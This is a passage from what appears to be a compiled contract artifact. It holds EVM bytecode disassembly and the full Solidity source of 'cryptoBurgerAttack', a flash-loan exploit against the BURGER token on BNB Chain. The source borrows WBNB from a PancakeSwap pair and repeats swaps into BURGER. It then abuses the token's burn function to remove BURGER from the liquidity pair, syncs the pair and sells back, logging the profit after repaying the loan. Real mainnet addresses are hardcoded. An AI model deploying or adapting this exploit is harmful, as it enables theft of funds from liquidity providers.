SHL SUB SWAP1 SWAP3 AND PUSH1 0x20 SWAP3 DUP4 MUL SWAP2 SWAP1 SWAP2 ADD SWAP1 SWAP2 ADD MSTORE PUSH1 0x40 MLOAD PUSH4 0x5C11D795 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x5C11D795 SWAP1 PUSH2 0x2B45 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP7 SWAP1 DUP9 SWAP1 TIMESTAMP SWAP1 PUSH1 0x4 ADD PUSH2 0x2F41 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2B5F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2B73 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x2B94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x80 DUP7 DUP9 SUB SLT ISZERO PUSH2 0x2BAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP6 CALLDATALOAD PUSH2 0x2BBA DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP5 POP PUSH1 0x20 DUP7 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 DUP7 ADD CALLDATALOAD SWAP3 POP PUSH1 0x60 DUP7 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x2BE5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP9 ADD SWAP2 POP DUP9 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x2BF9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD DUP2 DUP2 GT ISZERO PUSH2 0x2C08 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP10 PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0x2C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP7 SWAP10 SWAP6 SWAP9 POP SWAP4 SWAP7 POP PUSH1 0x20 ADD SWAP5 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2C40 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x2C4B DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2C6B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH2 0x2C76 DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x20 DUP1 DUP6 ADD SWAP5 POP DUP1 DUP5 ADD PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2CE2 JUMPI DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP8 MSTORE SWAP6 DUP3 ADD SWAP6 SWAP1 DUP3 ADD SWAP1 PUSH1 0x1 ADD PUSH2 0x2CBD JUMP JUMPDEST POP SWAP5 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST DUP3 DUP2 MSTORE PUSH1 0x40 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0x2D06 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x2CA9 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2D21 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x2D39 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP6 ADD SWAP2 POP DUP6 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x2D4D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP2 DUP2 GT ISZERO PUSH2 0x2D5F JUMPI PUSH2 0x2D5F PUSH2 0x2C7D JUMP JUMPDEST DUP1 PUSH1 0x5 SHL PUSH1 0x40 MLOAD PUSH1 0x1F NOT PUSH1 0x3F DUP4 ADD AND DUP2 ADD DUP2 DUP2 LT DUP6 DUP3 GT OR ISZERO PUSH2 0x2D84 JUMPI PUSH2 0x2D84 PUSH2 0x2C7D JUMP JUMPDEST PUSH1 0x40 MSTORE SWAP2 DUP3 MSTORE DUP5 DUP3 ADD SWAP3 POP DUP4 DUP2 ADD DUP6 ADD SWAP2 DUP9 DUP4 GT ISZERO PUSH2 0x2DA2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 DUP6 ADD SWAP4 JUMPDEST DUP3 DUP6 LT ISZERO PUSH2 0x2DC0 JUMPI DUP5 MLOAD DUP5 MSTORE SWAP4 DUP6 ADD SWAP4 SWAP3 DUP6 ADD SWAP3 PUSH2 0x2DA7 JUMP JUMPDEST SWAP9 SWAP8 POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2DDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x18 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422062616C616E6365206F6620636F6E74726163740000000000000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x2E4C JUMPI PUSH2 0x2E4C PUSH2 0x2E24 JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0x2E6D JUMPI PUSH2 0x2E6D PUSH2 0x2E24 JUMP JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x2E8F JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH2 0x2EA7 JUMPI PUSH2 0x2EA7 PUSH2 0x2E24 JUMP JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EBE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x2C76 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP5 DUP2 MSTORE PUSH1 0x0 PUSH1 0x20 DUP6 DUP2 DUP5 ADD MSTORE PUSH1 0x1 DUP1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x40 DUP5 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP5 ADD MSTORE DUP4 MLOAD DUP1 PUSH1 0x80 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2F16 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0xA0 ADD MSTORE DUP3 ADD PUSH2 0x2EFA JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0x2F28 JUMPI PUSH1 0x0 PUSH1 0xA0 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0xA0 ADD SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST DUP6 DUP2 MSTORE DUP5 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0xA0 PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0x2F60 PUSH1 0xA0 DUP4 ADD DUP7 PUSH2 0x2CA9 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 SWAP1 SWAP5 AND PUSH1 0x60 DUP4 ADD MSTORE POP PUSH1 0x80 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP INVALID STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP DELEGATECALL 0xD CALLER 0xDE PUSH8 0x37367A1CCB0CE6A0 JUMP PUSH10 0x8D993A17E10000000000 STOP STOP STOP STOP STOP STOP STOP 0xBB 0x4C 0xDB SWAP13 0xBD CALLDATASIZE 0xB0 SHL 0xD1 0xCB 0xAE 0xBF 0x2D 0xE0 DUP14 SWAP2 PUSH20 0xBC095C00000000000000000000000010ED43C718 PUSH18 0x4EB63D5AA57B78B54704E256024E54686520 PUSH19 0x657175697265642057424E4220616D6F756E74 KECCAK256 PUSH7 0x6F722031394D50 EXP 0x5C 0x23 0xC9 STOP 0xBD 0xDE SGT MSTORE 0xBB MULMOD RETURNDATASIZE SIGNEXTEND PUSH5 0x80339DC331 PUSH29 0x387F4A23FF9AECC606FF45A2646970667358221220E13B67340FB96DCB 0xB1 0xAB EXTCODEHASH 0xC9 PUSH12 0xDAE0EFF6AD2686696E44C927 KECCAK256 0x5C PUSH8 0x3A92985764736F6C PUSH4 0x4300080D STOP CALLER ",
  "sha1": "ae55eecb3630ea3372c475dec36af7c1c71d9745",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../interfaces/IERC20.sol\";\nimport \"../interfaces/sushiswap.sol\";\n\ninterface IPancakeCallee {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IWBNB is IERC20 {\n    function deposit() external payable;\n\n    function withdraw(uint256) external;\n}\n\ncontract cryptoBurgerAttack is IPancakeCallee {\n    address private constant PANCAKE_SWAP_ROUTER =\n        0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private constant PANCAKE_SWAP_FACTORY =\n        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\n\n    address private constant PANCAKE_SWAP_PAIR =\n        0x02b0551B656509754285eeC81eE894338E14C5DD;\n\n    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n\n    address private constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;\n\n    address private constant BURGER =\n        0xF40d33DE6737367A1cCB0cE6a056698D993A17E1;\n\n    IERC20 WBNB_interface = IERC20(WBNB);\n    IERC20 BURGER_interface = IERC20(BURGER);\n\n    event LOG(string message, uint256 amount);\n    event LOGAdd(string message, address amount);\n\n    function flashLoan(address _tokenBorrow, uint256 _amount) public {\n        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(\n            _tokenBorrow,\n            USDC\n        );\n\n        // Check if pair exists\n        require(pair != address(0), \"Pair doesn't exists!\");\n\n        address token0 = IPancakePair(pair).token0();\n        address token1 = IPancakePair(pair).token1();\n        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;\n        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;\n\n        IPancakePair(pair).swap(\n            amount0Out,\n            amount1Out,\n            address(this),\n            abi.encode(_tokenBorrow, _amount)\n        );\n    }\n\n    function pancakeCall(\n        address _sender,\n        uint256 _amount0,\n        uint256 _amount1,\n        bytes calldata _data\n    ) external override {\n        address token0 = IPancakePair(msg.sender).token0();\n        address token1 = IPancakePair(msg.sender).token1();\n\n        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(\n            token0,\n            token1\n        );\n\n        require(msg.sender == pair, \"Not a pair contract!\");\n        require(_sender == address(this), \"!sender\");\n\n        (address tokenBorrow, uint256 amount) = abi.decode(\n            _data,\n            (address, uint256)\n        );\n\n        // Current contract balance\n        emit LOG(\"Contract balance is\", address(this).balance);\n\n        // Insert swap logic\n        uint256 max_BURG_amount = 19999 * 1e18;\n\n        address[] memory path;\n        path = new address[](2);\n\n        path[0] = WBNB;\n        path[1] = BURGER;\n\n        uint256[] memory howMuchIneed;\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n\n        emit LOG(\n            \"WBNB balance of contract after receivving flashloan\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token\",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 1st swap: \",\n            howMuchIneed[0]\n        );\n\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 2nd swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 3rd swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 4th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 5th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 6th swap: \",\n            howMuchIneed[0]\n        );\n\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 7th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 8th swap: \",\n            howMuchIneed[0]\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        // Get current BURG supply\n        emit LOG(\n            \"WBNB Balance of contract after swaps...\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        emit LOG(\"How much I need for another swap\", howMuchIneed[0]);\n\n        // Burn logic\n        for (uint256 i = 0; i < 141; i++) {\n            BURGER_interface.burn(PANCAKE_SWAP_PAIR, 19999 * 1e18);\n        }\n        emit LOG(\n            \"BURG balance of Package pair\",\n            BURGER_interface.balanceOf(PANCAKE_SWAP_PAIR)\n        );\n        IPancakePair(PANCAKE_SWAP_PAIR).sync();\n\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n\n        swapIt(\n            BURGER,\n            WBNB,\n            BURGER_interface.balanceOf(address(this)),\n            0,\n            payable(address(this))\n        );\n\n        emit LOG(\n            \"BURG balance of contract after swap\",\n            BURGER_interface.balanceOf(address(this))\n        );\n\n        // Compute Repay Amount\n        uint256 fee = ((amount * 3) / 997) + 1;\n        uint256 amountToRepay = amount + fee;\n\n        IERC20(tokenBorrow).transfer(pair, amountToRepay);\n        emit LOG(\"Repay amount\", amountToRepay);\n\n        emit LOG(\n            \"Profit after repay: \",\n            WBNB_interface.balanceOf(address(this))\n        );\n        emit LOG(\"Total BURG supply \", BURGER_interface.totalSupply());\n    }\n\n    function swapIt(\n        address _tokenIn,\n        address _tokenOut,\n        uint256 amountIn, //\n        uint256 amountOut, // The amount of $BURG token to receive\n        address _to\n    ) internal {\n        IERC20(_tokenIn).approve(PANCAKE_SWAP_PAIR, amountIn);\n        IERC20(_tokenIn).approve(PANCAKE_SWAP_ROUTER, amountIn);\n\n        address[] memory path;\n        path = new address[](2);\n\n        path[0] = _tokenIn;\n        path[1] = _tokenOut;\n\n        IPancakeRouter01(PANCAKE_SWAP_ROUTER)\n            .swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                amountIn,\n                amountOut,\n                path,\n                _to,\n                block.timestamp\n            );\n    }\n\n    receive() external payable {}\n}\n",
  "sourcePath": "contracts/burger_attack.sol",
  "type": "contract"
}